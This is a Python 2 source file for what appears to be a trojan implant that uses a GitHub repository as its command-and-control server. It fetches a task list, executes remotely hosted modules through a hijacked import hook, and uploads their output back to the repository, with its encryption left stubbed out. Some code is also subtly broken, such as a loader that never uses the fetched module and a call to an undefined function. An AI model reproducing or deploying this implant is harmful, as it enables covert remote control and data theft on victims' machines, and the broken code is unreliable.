import json
import base64
import sys
import time
import imp
import threading
import Queue
import zlib
import zipfile
import Config
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from github3 import login

class ReImp(object):
	def __init__(self):
		self.code = ""

	def find_module(self, fullname, path=None):
		lib = get_file(config.my_mod() + fullname).decoded
		if lib is not None:
			self.code = decrypt(self.code)
			return self
		return None

	def load_module(self,name):
		module = imp.new_module(name)
		exec self.code in module.__dict__
		sys.modules[name] = module
		return module

def connect():
	gh = login(token = config.my_token())
	repo = gh.repository(config.my_usr(), config.my_repo())
	return gh, repo

def get_file(path):
	gh, repo = connect()
	print str(path)
	contents = repo.file_contents(path)
	return contents

def create_config():
	gh, repo = connect()
	repo.create_file(config.my_config(), config.com_mess(), "new")
	return

def get_config():
	config_json = get_file(config.my_config()).decoded
	if config_json == None or len(config_json) <= 5:
		return None
	config_json = decrypt(config_json)
	config_file = json.loads(config_json)
	for task in config_file:
		if task['module'] not in sys.modules:
			exec("import %s" % task['module'])
	return config_file

def clear_config():
	gh, repo = connect()
	repo.file_contents(config.my_config()).update(config.com_mess(), "new")

def push_data(data):
	gh, repo = connect()
	repo.create_file(config.my_data(), config.com_mess(), encrypt(data))
	return

def decrypt(data):
#	decoded = base64.b64decode(data)
#	compressed = zipfile.ZipFile(decoded, 'r')
#	decompressed = compressed.read(name, config.my_pwd())
#	return decompressed
	return data

def encrypt(data):
#	key = config.my_pk()
#	key = PKCS1_OAEP.new(key)
#	size = 256
#	offset = 0
#	encrypted = ""	
#	compressed = zlib.compress(data)
#	while offset < len(compressed):
#		chunk = compressed[offset:offset+size]
#		if len(chunk) % size != 0:
#			chunk += " " * (size - len(chunk))
#		encrypted += key.encrypt(chunk)
#		offset += size
#	encoded = base64.b64encode(encrypted)
#	return encoded
	return data

def run_module(task):
	print "rm -- "
	print task
	print sys.modules[task]
	mod = sys.modules[task]
	print mod
	mod1 = PyModule_GetDict(mod)
	print mod1
	result = mod.run()
	if result is not None:
		push_data(result)
	return

def module_runner():
	while not config.tasks.empty():
		task = config.tasks.get()
		print "mr -- "
		print task
		t = threading.Thread(target=run_module, args = (task['module'],))
		t.start()
		if 'sleep' in task:
			time.sleep(task['sleep'])
	return

config = Config.Config()
sys.meta_path = [ReImp()]
#create_config()
while True:
	if config.tasks.empty():
		config_file = get_config()
		print "conf -- "
		print config_file
		if config_file == None:
			time.sleep(config.my_sleep())
			continue
		for task in config_file:
			print "task -- "
			print task
			config.tasks.put(task)
	if not config.tasks.empty():
		module_runner()
		#clear_config()
